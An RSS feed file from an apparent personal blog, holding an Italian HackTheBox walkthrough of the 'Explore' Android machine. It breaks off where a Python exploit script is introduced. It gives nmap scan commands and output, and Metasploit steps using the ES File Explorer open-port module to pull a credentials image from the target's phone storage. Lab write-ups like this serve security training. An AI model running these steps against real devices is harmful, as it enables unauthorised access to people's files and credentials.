@@ -1,0 +1,368 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Walkthrough HackTheBox on HomePage</title>
+    <link>/categories/walkthrough-hackthebox/</link>
+    <description>Recent content in Walkthrough HackTheBox on HomePage</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language><atom:link href="/categories/walkthrough-hackthebox/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Walkthrough Explore</title>
+      <link>/posts/walkthrough-explore/walkthrough_explore_ctf/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/walkthrough-explore/walkthrough_explore_ctf/</guid>
+      <description>Table of Contents:
+ Enumerazione con Nmap Analisi delle porte  Sfruttamento dell’Exploit con Metasploit Sfruttamento dell’Exploit con CVE (Script Python)   Privilage Escalation  Explore è una macchina Android di facile difficoltà. L’enumerazione della rete rivela un servizio vulnerabile, sfruttabile tramite un modulo Metasploit e fornisce un accesso in lettura limitato alla macchina. Un’ulteriore enumerazione dei file, rivela le credenziali SSH di un utente del sistema, consentendo così l’accesso remoto alla macchina.</description>
+      <content>&lt;p&gt;Table of Contents:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#enumerazione-con-nmap&#34;&gt;Enumerazione con Nmap&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#analisi-delle-porte&#34;&gt;Analisi delle porte&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#sfruttamento-dell-exploit-con-metasploit&#34;&gt;Sfruttamento dell’Exploit con Metasploit&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#sfruttamento-dell-exploit-con-cve--script-python-&#34;&gt;Sfruttamento dell’Exploit con CVE (Script Python)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#privilage-escalation&#34;&gt;Privilage Escalation&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+  &lt;img src=&#34;/images/LogoExploreCTF.png&#34;  class=&#34;left&#34;  style=&#34;width: 300px&#34;  /&gt;
+
+
+&lt;p&gt;Explore è una macchina Android di facile difficoltà. L’enumerazione della rete rivela un servizio vulnerabile, sfruttabile tramite un modulo Metasploit e fornisce un accesso in lettura limitato alla macchina.
+Un’ulteriore enumerazione dei file, rivela le credenziali SSH di un utente del sistema, consentendo così l’accesso remoto alla macchina.
+Infine, l’aggressore è in grado di inoltrare localmente una porta filtrata utilizzando il tunneling SSH, al fine di accedere alla shell di Android tramite l’Android Debug Bridge (ADB). Questa eventualità consente all’utente malintenzionato di eseguire comandi come utente root.&lt;/p&gt;
+&lt;h1 id=&#34;enumerazione-con-nmap&#34;&gt;Enumerazione con Nmap&lt;/h1&gt;
+&lt;p&gt;Eseguiamo l’enumerazione dei servizi con Nmap, facciamo una prima scansione con il seguente comando:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;1. ports&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;nmap -p- --min-rate&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt; -T4 10.10.10.247 | grep ^&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0-9&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; | cut -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; -f &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; | tr &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt; | sed s/,$//&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
+2. nmap -p$ports -sC -sV &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;address&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;L’output sarà:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.93 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2022-11-29 09:58 EST
+Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; explore &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.10.10.247&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.039s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+
+PORT      STATE    SERVICE VERSION
+2222/tcp  open     ssh     &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| fingerprint-strings: 
+|   NULL: 
+|_    SSH-2.0-SSH Server - Banana Studio
+| ssh-hostkey: 
+|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; 7190e3a7c95d836634883debb4c788fb &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+5555/tcp  filtered freeciv
+34245/tcp open     unknown
+| fingerprint-strings: 
+|   GenericLines: 
+|     HTTP/1.0 &lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt; Bad Request
+|     Date: Tue, &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; 14:59:13 GMT
+|     Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;
+|     Content-Type: text/plain; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;US-ASCII
+|     Connection: Close
+|     Invalid request line:
+|   GetRequest: 
+|     HTTP/1.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;412&lt;/span&gt; Precondition Failed
+|     Date: Tue, &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; 14:59:13 GMT                                                                                                         
+|     Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;                                                                                                                           
+|   HTTPOptions:                                                                                                                                  
+|     HTTP/1.0 &lt;span style=&#34;color:#ae81ff&#34;&gt;501&lt;/span&gt; Not Implemented                                                                                                                
+|     Date: Tue, &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; 14:59:18 GMT                                                                                                         
+|     Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;
+|     Content-Type: text/plain; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;US-ASCII
+|     Connection: Close
+|     Method not supported: OPTIONS
+|   Help: 
+|     HTTP/1.0 &lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt; Bad Request
+|     Date: Tue, &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; 14:59:34 GMT
+|     Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;
+|     Content-Type: text/plain; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;US-ASCII
+|     Connection: Close
+|     Invalid request line: HELP
+|   RTSPRequest: 
+|     HTTP/1.0 &lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt; Bad Request
+|     Date: Tue, &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; 14:59:18 GMT
+|     Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;
+|     Content-Type: text/plain; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;US-ASCII
+|     Connection: Close
+|     valid protocol version: RTSP/1.0
+|   SSLSessionReq: 
+|     HTTP/1.0 &lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt; Bad Request
+|     Date: Tue, &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; 14:59:34 GMT
+|     Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;
+|     Content-Type: text/plain; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;US-ASCII
+|     Connection: Close
+|     Invalid request line: 
+|     ?G???,???&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;~?
+|     ??&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;????w????&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;?o?
+|   TLSSessionReq: 
+|     HTTP/1.0 &lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt; Bad Request
+|     Date: Tue, &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; 14:59:34 GMT
+|     Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt;
+|     Content-Type: text/plain; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;US-ASCII
+|     Connection: Close
+|     Invalid request line: 
+|     ??random1random2random3random4
+|   TerminalServerCookie: 
+|     HTTP/1.0 &lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt; Bad Request
+|     Date: Tue, &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; 14:59:34 GMT
+|     Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;
+|     Content-Type: text/plain; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;US-ASCII
+|     Connection: Close
+|     Invalid request line: 
+|_    Cookie: mstshash&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;nmap
+42135/tcp open     http    ES File Explorer Name Response httpd
+|_http-title: Site doesn&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;t have a title (text/html).
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|_http-title: Site doesn&amp;#39;&lt;/span&gt;t have a title &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;text/plain&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+&lt;span style=&#34;color:#f92672&#34;&gt;==============&lt;/span&gt;NEXT SERVICE FINGERPRINT &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SUBMIT INDIVIDUALLY&lt;span style=&#34;color:#f92672&#34;&gt;)==============&lt;/span&gt;
+SF-Port2222-TCP:V&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;7.93%I&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;7%D&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;11/29%Time&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;63861E0F%P&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;N
+SF:ULL,24,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
+&lt;span style=&#34;color:#f92672&#34;&gt;==============&lt;/span&gt;NEXT SERVICE FINGERPRINT &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SUBMIT INDIVIDUALLY&lt;span style=&#34;color:#f92672&#34;&gt;)==============&lt;/span&gt;
+SF-Port34245-TCP:V&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;7.93%I&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;7%D&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;11/29%Time&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;63861E0E%P&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
+SF:GenericLines,AA,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x2
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:029\x20Nov\x202022\x2014:59:13\x20GMT\r\nContent-Length:\x2022\r\nConte
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:nt-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:\r\nInvalid\x20request\x20line:\x20&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;%r&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;GetRequest,5C,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HTTP/1\.1\x20412
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:\x20Precondition\x20Failed\r\nDate:\x20Tue,\x2029\x20Nov\x202022\x2014:
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:59:13\x20GMT\r\nContent-Length:\x200\r\n\r\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;%r&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;HTTPOptions,B5,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HTTP/1
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:\.0\x20501\x20Not\x20Implemented\r\nDate:\x20Tue,\x2029\x20Nov\x202022\
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:x2014:59:18\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pl
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:ain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:20supported:\x20OPTIONS&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;%r&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RTSPRequest,BB,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HTTP/1\.0\x20400\x20Bad\x20
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:Request\r\nDate:\x20Tue,\x2029\x20Nov\x202022\x2014:59:18\x20GMT\r\nCon
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:tent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:r\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF::\x20\x20RTSP/1\.0&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;%r&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Help,AE,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:ate:\x20Tue,\x2029\x20Nov\x202022\x2014:59:34\x20GMT\r\nContent-Length:
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:\x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;%r&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SSLSessionRe
+SF:q,DD,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x2029\x20Nov\
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:x202022\x2014:59:34\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x2
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:0text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:\x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:?\0\?\?{\?\?\?\?w\?\?\?\?&amp;lt;=\?o\?\x10n\0\0\(\0\x16\0\x13\0&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;%r&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;TerminalS
+SF:erverCookie,CA,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x20
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:29\x20Nov\x202022\x2014:59:34\x20GMT\r\nContent-Length:\x2054\r\nConten
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:r\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20mst
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:shash=nmap&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;%r&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;TLSSessionReq,DB,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\n
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:Date:\x20Tue,\x2029\x20Nov\x202022\x2014:59:34\x20GMT\r\nContent-Length
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF::\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnecti
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:on:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;SF:0e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
+Service Info: Device: phone
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 101.61 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;analisi-delle-porte&#34;&gt;Analisi delle porte&lt;/h1&gt;
+&lt;p&gt;Nmap rivela un server SSH in esecuzione sulla porta 2222, un servizio HTTP in esecuzione sulla porta 59777 (nel mio caso é 42135) e un servizio TCP filtrato in esecuzione sulla porta 5555. Cercando online la porta 5555, si ottiene il seguente:&lt;/p&gt;
+
+  &lt;img src=&#34;/images/Explore1.png&#34;  class=&#34;left&#34;  style=&#34;width: 600px&#34;  /&gt;
+
+
+&lt;p&gt;Questo sito web mostra le assegnazioni delle porte e le vulnerabilità note.&lt;/p&gt;
+
+  &lt;img src=&#34;/images/Explore2.png&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;
+
+
+&lt;p&gt;Nello snippet di cui sopra possiamo vedere che la porta 5555 è utilizzata da Android Debug Bridge (ADB).
+Android Debug Bridge (adb) è uno strumento a riga di comando che consente agli utenti di comunicare con un dispositivo Android.
+Dato che la porta 5555 è filtrata e non è possibile connettersi tramite adb, cerchiamo online la porta 59777 che rivela il seguente risultato:&lt;/p&gt;
+
+  &lt;img src=&#34;/images/Explore3.png&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;
+
+
+&lt;p&gt;Questa porta è utilizzata dall’applicazione ES File Explorer File Manager per Android, secondo questo sito web.
+Questo sito web indica anche una vulnerabilità nota per questa applicazione, in cui un utente malintenzionato è in grado di eseguire comandi arbitrari sull’host. Di seguito vedremo due metodologie per raccogliere le credenziali ssh.&lt;/p&gt;
+&lt;h2 id=&#34;sfruttamento-dellexploit-con-metasploit&#34;&gt;Sfruttamento dell’Exploit con Metasploit&lt;/h2&gt;
+&lt;p&gt;La ricerca nel framework metasploit rivela un modulo per questa vulnerabilità:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;1. msfconsole
+2. search es file explorer
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;/images/Explore4.png&#34;  class=&#34;left&#34;  style=&#34;width: 900px&#34;  /&gt;
+
+
+&lt;p&gt;Il modulo di interesse è:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;   &lt;span style=&#34;color:#75715e&#34;&gt;#   Name                                                      Disclosure Date  Rank       Check  Description&lt;/span&gt;
+   -   ----                                                      ---------------  ----       -----  -----------
+   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;   auxiliary/scanner/http/es_file_explorer_open_port         2019-01-16       normal     No     ES File Explorer Open Port
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Utilizziamo questo modulo ed elenchiamo le sue opzioni:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;1. use auxiliary/scanner/http/es_file_explorer_open_port
+2. options
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;/images/Explore5.png&#34;  class=&#34;left&#34;  style=&#34;width: 900px&#34;  /&gt;
+
+
+&lt;p&gt;Successivamente, si imposta il parametro RHOSTS con l’IP dell’host e si digita exploit:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;1. set RHOSTS 10.10.10.247
+2. exploit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;/images/Explore6.png&#34;  class=&#34;left&#34;  style=&#34;width: 600px&#34;  /&gt;
+
+
+&lt;p&gt;Il risultato è positivo. L’azione del parametro è stata impostata, per impostazione predefinita su GETDEVICEINFO e quindi l’uscita mostra informazioni sul dispositivo. Elenchiamo tutte le azioni di questo modulo.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;show actions
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;/images/Explore7.png&#34;  class=&#34;left&#34;  style=&#34;width: 500px&#34;  /&gt;
+
+
+&lt;p&gt;Impostando l’azione su LISTPICS, si ottengono i seguenti risultati.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;1. set action LISTPICS
+2. exploit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;/images/Explore8.png&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;
+
+
+&lt;p&gt;Questa istruzione sembra elencare tutte le immagini memorizzate nella directory DCIM del telefono. Impostiamo l’azione su GETFILE e scarichiamo il file creds.jpg:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;1. set action GETFILE
+2. set ACTIONITEM /storage/emulated/0/DCIM/creds.jpg
+3. exploit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;/images/Explore9.png&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;
+
+
+&lt;p&gt;Successivamente, possiamo aprire l’immagine utilizzando il visualizzatore di immagini feh:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;1. sudo apt install feh
+2. feh ~/.msf4/loot/20211025151836_default_10.10.10.247_getFile_410464.jpg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;sfruttamento-dellexploit-con-cve-script-python&#34;&gt;Sfruttamento dell’Exploit con CVE (Script Python)&lt;/h2&gt;
+&lt;p&gt;Effettuando delle ricerce sul ES File Explorer 4.1.9.7.4 troviamo la seguente pagina di Exploit Databse:&lt;/p&gt;
+
+  &lt;img src=&#34;/images/Explore10.png&#34;  class=&#34;left&#34;  style=&#34;width: 700px&#34;  /&gt;
+
+
+&lt;p&gt;Salviamo il codice di questo exploit. ES File Explorer crea un servizio HTTP associato alla porta 59777 in fase di esecuzione, che fornisce oltre 10 comandi per l’accesso ai dati nel telefono cellulare dell’utente e l’esecuzione dell’applicazione; tuttavia, il servizio non controlla questa richiesta. Eseguendo l’exploit usando python3 otteniamo un elenco di comandi disponibili che possiamo effettivamente eseguire usando quell’exploit:&lt;/p&gt;
